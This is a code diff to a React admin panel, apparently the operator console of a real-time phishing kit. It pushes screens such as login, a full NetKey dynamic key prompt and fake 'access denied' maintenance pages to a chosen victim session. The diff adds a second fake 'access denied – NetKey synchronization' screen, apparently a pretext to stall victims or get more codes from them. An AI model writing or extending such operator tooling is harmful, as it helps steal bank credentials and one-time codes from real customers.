@@ -556,6 +556,15 @@ export default function AdminPanel() {
       setActiveModal(screen);
       return;
     }
+    
+    // Handle direct screen changes for certain screens (no modal needed)
+    if (["acceso_denegado", "acceso_denegado_2"].includes(screen)) {
+      sendScreenChange({
+        tipo: `mostrar_${screen}`,
+        sessionId: selectedSessionId
+      });
+      return;
+    }
 
     // Para la pantalla de folio, recuperamos el folio ingresado para usarlo después
     if (screen === "folio") {
@@ -1020,6 +1029,7 @@ export default function AdminPanel() {
                   <option value="login">1. Login</option>
                   <option value="netkey2">2. NetKey 2 - Clave Dinámica Completa</option>
                   <option value="acceso_denegado">3. Acceso Denegado - NetKey Mantenimiento</option>
+                  <option value="acceso_denegado_2">4. Acceso Denegado 2 - Sincronización NetKey</option>
                 </select>
               </div>
             </div>
